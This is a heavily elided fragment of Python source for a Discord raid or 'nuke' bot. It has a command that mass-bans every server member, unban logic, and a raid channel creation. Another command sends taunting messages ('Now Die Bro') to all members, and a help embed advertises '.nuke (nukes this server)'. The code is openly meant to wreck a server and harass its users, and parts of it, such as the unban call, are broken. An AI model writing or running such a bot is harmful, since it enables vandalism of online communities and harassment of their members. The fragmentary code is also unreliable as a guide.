...
async def nuke(ctx):
    ...
    for member in guild.members:
     try:
       ...
       print(Fore.RED + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    ...
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("TestUser#0001")
        print(Fore.RED + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Raid Raid Boombayah")
...
async def ObamaMessage(ctx):
    ...
    for member in list(client.get_all_members()):
        ...
        try:
            embed = discord.Embed(title="How Was The Raid!?", description="Never Mess with Us." , color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Now Die Bro")
...
async def ObamaHelp(ctx):
    ...
    await asyncio.sleep(0)
    try:
            embed = discord.Embed(title="BotHelp", description="Commands: \n \n .nuke (nukes this server) " , color=discord.Colour.purple())
            embed.set_footer(text="kek")
